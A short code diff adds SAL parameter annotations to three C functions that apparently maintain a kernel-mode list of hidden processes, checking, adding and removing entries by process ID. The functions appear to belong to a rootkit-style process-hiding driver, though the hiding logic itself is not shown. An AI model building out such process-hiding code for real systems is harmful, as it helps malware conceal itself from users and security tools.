@@ -11,7 +11,7 @@
  *      if process is already hidden 
  */
 BOOLEAN PsListHiddenCheck(
-    IN ULONG Pid
+    _In_ ULONG Pid
 ) {
     BOOLEAN        Found = FALSE;
     PPSHIDDEN_LIST List  = NULL;
@@ -55,8 +55,8 @@ BOOLEAN PsListHiddenCheck(
  *      execution status of function 
  */
 NTSTATUS PsListHiddenAdd(
-    ULONG		Pid,
-    PLIST_ENTRY ProcessEntry
+    _In_ ULONG		 Pid,
+    _In_ PLIST_ENTRY ProcessEntry
 ) {
     PPSHIDDEN_LIST PsHidden = NULL;
     NTSTATUS	   NtStatus = STATUS_SUCCESS;
@@ -96,8 +96,8 @@ END:
  *      of hidden process into the param
  */
 NTSTATUS PsListHiddenRemove(
-    ULONG        Pid,
-    PLIST_ENTRY* ProcessEntry
+    _In_  ULONG        Pid,
+    _Out_ PLIST_ENTRY* ProcessEntry
 ) {
     NTSTATUS       NtStatus  = STATUS_INVALID_PARAMETER;
     PPSHIDDEN_LIST PshdEntry = NULL;
